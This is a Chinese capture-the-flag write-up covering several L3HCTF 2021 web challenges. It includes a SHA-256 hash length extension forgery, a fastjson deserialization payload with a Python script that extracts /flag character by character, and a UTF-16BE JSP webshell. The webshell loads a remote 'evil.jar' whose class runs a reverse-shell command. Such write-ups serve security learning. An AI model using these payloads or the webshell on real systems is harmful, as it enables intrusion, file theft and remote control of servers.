# 0RAYS-L3HCTF2021 writeup-web

阅读量 **1538433**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-11-17 15:29:01

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t019af26be6bffd9bd8.png)

## Easy PHP

![](https://p5.ssl.qhimg.com/t0130b7fd4c92d97011.png)

页面看起来没毛病 复制一下就发现有问题

看响应包hex 再url编码即可

    
    
    GET /?username=admin&%e2%80%ae%e2%81%a6%4c%33%48%e2%81%a9%e2%81%a6%70%61%73%73%77%6f%72%64=%e2%80%ae%e2%81%a6%43%54%46%e2%81%a9%e2%81%a6%6c%33%68%63%74%66 HTTP/1.1
    Host: 124.71.176.131:10001
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Pragma: no-cache
    Cache-Control: no-cache
    

## Image Service 1

可以看到他人分享的链接

admin不可以 Admin成功

![](https://p3.ssl.qhimg.com/t01e00c535c158355b1.png)

## image Service 2

###  分析

可以发现flag2是模糊的  
可以从该分享链接的参数中发现原因

    
    
    http://121.36.209.245:10002/get?blur=20&text=secret&textsize=50&token=782dd8dd3be70e52374f188814b561cecb4a26350729d924d6606c918bc803bd&uuid=e19d069a-652a-471d-8c83-79010b5aaf66&x1=200&y1=200
    

blur=20 是控制模糊的参数  
x1=200&y1=200 对图片进行了裁切 只能看到图片的一部分  
text=secret 即为图片经过高斯模糊后覆盖的文字内容  
因为在service会对请求参数与token校验  
所以应该要分析出token是怎么生成的，然后伪造token

###  程序

~~不会有web手不会用ida和gdb吧~~

ida打开 找到token函数 分析了一下 猜测会把 APP_SECRET 和所有请求参数拼接 然后sha256一下

![](https://p1.ssl.qhimg.com/t01190e63f711f3e4bc.png)

但是这里看不出来如何拼接 拼接的格式

所以还是要动调  
service和app都调了一下  
拼接内容很容易就可以看出

![](https://p3.ssl.qhimg.com/t016376db57f9cd6da0.png)

大概如下

    
    
    map[blur:[20] height:[1000] text:[] textcolor:[FFFFFF] textsize:[0] thumbnail:[false] uuid:[c314a3f2-1b14-40e6-8a9d-94acef8d1ac3] width:[1000] x0:[0] x1:[0] y0:[0] y1:[0]]
    

###  解法一 hash长度扩展攻击

####  原理

hash长度扩展攻击的基本场景：

~~网上很多讲的很难理解~~

简单来说 已知 **message** 及 **hash(secret_key+message)**

那么通过这种攻击手段 可以构造得到 **message+一些奇怪的字符+自定义字符** 及
**hash(secret_key+message+一些奇怪的字符+自定义字符)**

实际场景可能比较复杂 可能涉及到一些解析漏洞等，但是原理就是上面的

####  工具

**hash_extender**

输入

  * data 对应 message的
  * signature 对应 hash(secret_key+message)
  * secret 对应 secret_key的长度
  * append 对应 自定义字符

    
    
    ./hash_extender --data "map[blur:[20] text:[secret] textsize:[50] uuid:[b9bf1a78-ae0e-4b44-85f0-e1f07ede0165] x1:[200] y1:[200]]" --secret 16 --append "] textcolor:[FFFFFF] textsize:[0] uuid:[b9bf1a78-ae0e-4b44-85f0-e1f07ede0165] x1:[1000] y1:[1000]]" --signature "6332c92d31ee3effa8185d11035bdcaace30d3dbc8a937a38b8276f478fac740" --format sha256
    

输出

  * New signature 对应 hash(secret_key+message+一些奇怪的字符+自定义字符)
  * New string 对应 message+一些奇怪的字符+自定义字符

    
    
    Type: sha256
    Secret length: 16
    New signature: 11e37f66cbaba0d326359dca220ce44c3a1895adf5eb8a73900a4f68ce4588c8
    New string: 6d61705b626c75723a5b32305d20746578743a5b7365637265745d207465787473697a653a5b35305d20757569643a5b62396266316137382d616530652d346234342d383566302d6531663037656465303136355d2078313a5b3230305d2079313a5b3230305d5d8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003c05d2074657874636f6c6f723a5b4646464646465d207465787473697a653a5b305d20757569643a5b62396266316137382d616530652d346234342d383566302d6531663037656465303136355d2078313a5b313030305d2079313a5b313030305d5d
    

####  做题

根据上面的对应关系 使用工具

    
    
    ./hash_extender --data "map[blur:[20] text:[secret] textsize:[50] uuid:[b9bf1a78-ae0e-4b44-85f0-e1f07ede0165] x1:[200] y1:[200]]" --secret 16 --append "] textcolor:[FFFFFF] textsize:[0] uuid:[b9bf1a78-ae0e-4b44-85f0-e1f07ede0165] x1:[1000] y1:[1000]]" --signature "6332c92d31ee3effa8185d11035bdcaace30d3dbc8a937a38b8276f478fac740" --format sha256
    

生成的内容 改一下请求再发包即可

    
    
    GET /get?blur=20&text=secret]+textsize%3a[50]+uuid%3a[b9bf1a78-ae0e-4b44-85f0-e1f07ede0165]+x1%3a[200]+y1%3a[200]]%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%c0&textcolor=FFFFFF&textsize=0&token=11e37f66cbaba0d326359dca220ce44c3a1895adf5eb8a73900a4f68ce4588c8&uuid=b9bf1a78-ae0e-4b44-85f0-e1f07ede0165&x1=1000&y1=1000 HTTP/1.1
    Host: 121.36.209.245:10002
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    

构造上稍微需要一些技巧  
此种解法无法获取清晰的flag 无法去掉blur参数 所以最后只能硬看flag

![](https://p5.ssl.qhimg.com/t014fab0211cfdec256.png)

###  解法二 直接构造

此种解法来自与ha1师傅赛后讨论 ~~ha1yyds~~

借助题目生成token，再配合一下解析漏洞，此处的构造十分巧妙

    
    
    flag2 uuid 3859089e-67cb-444d-9dfd-9c4b91b2f6c0
    自己图片 uuid a4bf20a9-9b29-47db-87cd-57b384bf8f9e
    

生成share

    
    
    POST /api/share/new HTTP/1.1
    Host: 121.36.209.245:10001
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
    Accept: application/json, text/plain, */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: multipart/form-data; boundary=---------------------------20510454632674357453543241695
    Content-Length: 364
    Origin: http://121.36.209.245:10001
    Connection: close
    Referer: http://121.36.209.245:10001/share
    Cookie: session=MTYzNzAyNDgwMXxEdi1CQkFFQ180SUFBUkFCRUFBQUhQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUVkV2x1ZEFZQ0FBST18Sf7Kozgbni82LyMsTGy7ATR6aY5RaG1_aexev9UqkAw=
    
    -----------------------------20510454632674357453543241695
    Content-Disposition: form-data; name="text"
    
    233] uuid:[3859089e-67cb-444d-9dfd-9c4b91b2f6c0 
    -----------------------------20510454632674357453543241695
    Content-Disposition: form-data; name="uuid"
    
    a4bf20a9-9b29-47db-87cd-57b384bf8f9e
    -----------------------------20510454632674357453543241695--    

那么在后端hash的内容为

    
    
    map[text:[233] uuid:[3859089e-67cb-444d-9dfd-9c4b91b2f6c0 ] uuid:[a4bf20a9-9b29-47db-87cd-57b384bf8f9e]]
    

题目返回token

    
    
    0b13728c6840122a52fa9ccd63838d1e847b4d7fccd0000414d38c42c2d33c21
    

此处构造与share原文一样的payload（后端拼接后与上面share拼接后的一样），获取图片，就能看到很清晰的flag了

    
    
    /get?text=233&uuid=3859089e-67cb-444d-9dfd-9c4b91b2f6c0&uuid=]+uuid%3a[a4bf20a9-9b29-47db-87cd-57b384bf8f9e&token=0b13728c6840122a52fa9ccd63838d1e847b4d7fccd0000414d38c42c2d33c21
    

![](https://p3.ssl.qhimg.com/t018d533a0eb56abe58.png)

## cover

弱口令登录admin admin

有fastjson。打fastjson

原理请看

<https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg>

    
    
    {
        "abc": {
            "@type": "java.lang.AutoCloseable",
            "@type": "org.apache.commons.io.input.BOMInputStream",
            "delegate": {
                "@type": "org.apache.commons.io.input.ReaderInputStream",
                "reader": {
                    "@type": "jdk.nashorn.api.scripting.URLReader",
                    "url": "file:///D:/1.txt"
                },
                "charsetName": "UTF-8",
                "bufferSize": 1024
            },
            "boms": [{
                "charsetName": "UTF-8",
                "bytes": [66]
            }]
        },
        "address": {
            "$ref": "$.abc.BOM"
        }
    }
    

文章中的payload是这样的，我们给他外面套上一层

    
    
    [{"password":{"abc":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"file:///flag"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"charsetName":"UTF-8","bytes":[76]}]},"address":{"$ref":"$.abc.BOM"}}}]
    

这样就有回显了。根据回显盲注出flag

![](https://p3.ssl.qhimg.com/t0165ec3c0f9096737f.png)

    
    
    import requests
    session = requests.session()
    burp0_url = "http://124.71.173.23:8088/dynamic_table"
    burp0_cookies = {"JSESSIONID": "129453A7ADA22FE7EFCA43989BBD7DB3"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
                     "Origin": "http://124.71.173.23:8088", "Connection": "close",
                     "Referer": "http://124.71.173.23:8088/dynamic_table", "Upgrade-Insecure-Requests": "1"}
    lllll = ['76']
    proxies = {
        "http": "http://127.0.0.1:8084",
        "https": "http://127.0.0.1:8084"
    }
    for i in range(45):
        for j in range(32, 127):
            burp0_data = {
                "data": "[{\"password\":{\"abc\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.BOMInputStream\",\"delegate\":{\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"jdk.nashorn.api.scripting.URLReader\",\"url\":\"file:///flag\"},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"boms\":[{\"charsetName\":\"UTF-8\",\"bytes\":[" + ",".join(
                    lllll)+','+str(j)+"]}]},\"address\":{\"$ref\":\"$.abc.BOM\"}}}]"}
            r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,proxies=proxies)
            if "charsetName" in r.text:
                print(chr(j),end='')
                lllll.append(str(j))
    

## bypass

jsp文件上传，不能上传可见字符。这里随便一种编码就行，比如UTF-16BE编码。

<https://github.com/threedr3am/JSP-Webshells/blob/master/jsp/10/README.md>

把这里的代码修改一下，只留下关键代码，来绕过waf。

上传jsp，双写绕后缀

shell.jsjspp

    
    
    <%@ page language="java" pageEncoding="UTF-16BE" %>
    <%@ page import="java.util.Iterator" %>
    <%@ page import="java.util.ServiceLoader" %>
    <%@ page import="java.net.URLClassLoader" %>
    <%@ page import="java.net.URL" %>
    <%
       Class clazz = Class.forName("javax.script.ScriptEng"+"ineFactory");
       Iterator serviceLoader = ServiceLoader.load(clazz, new URLClassLoader(new URL[]{new URL("http://ip:port/evil.jar")})).iterator();
       while (serviceLoader.hasNext()){
          serviceLoader.next();
       }
    %>
    

evil中  
EvilScript.java

    
    
    import java.io.BufferedReader;
    import java.io.File;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.List;
    import javax.script.ScriptEngine;
    import javax.script.ScriptEngineFactory;
    
    public class EvilScript implements ScriptEngineFactory {
    
      public EvilScript() throws Throwable {
        StringBuilder stringBuilder = new StringBuilder();
        try {
          Runtime.getRuntime().exec("反弹shell命令");
        } catch (Throwable e) {
          e.printStackTrace();
        }
        throw new Throwable(stringBuilder.toString());
      }
    
      @Override
      public String getEngineName() {
        return null;
      }
    
      @Override
      public String getEngineVersion() {
        return null;
      }
    
      @Override
      public List<String> getExtensions() {
        return null;
      }
    
      @Override
      public List<String> getMimeTypes() {
        return null;
      }
    
      @Override
      public List<String> getNames() {
        return null;
      }
    
      @Override
      public String getLanguageName() {
        return null;
      }
    
      @Override
      public String getLanguageVersion() {
        return null;
      }
    
      @Override
      public Object getParameter(String key) {
        return null;
      }
    
      @Override
      public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
      }
    
      @Override
      public String getOutputStatement(String toDisplay) {
        return null;
      }
    
      @Override
      public String getProgram(String... statements) {
        return null;
      }
    
      @Override
      public ScriptEngine getScriptEngine() {
        return null;
      }
    }
    

打包

    
    
    javac EvilScript.java
    jar -cvf evil.jar META-INF EvilScript.class
    

jar包结构

![](https://p3.ssl.qhimg.com/t01a008681fe6105d47.png)

上传后访问jsp,反弹shell

![](https://p1.ssl.qhimg.com/t01b7091e811c71b197.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **0RAYS** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/259487](/post/id/259487)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)
  * [Web安全](/tag/Web安全)

 **+1** __4赞

 __收藏

![](https://p2.ssl.qhimg.com/t0154f5d285696ed05b.png) 0RAYS

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

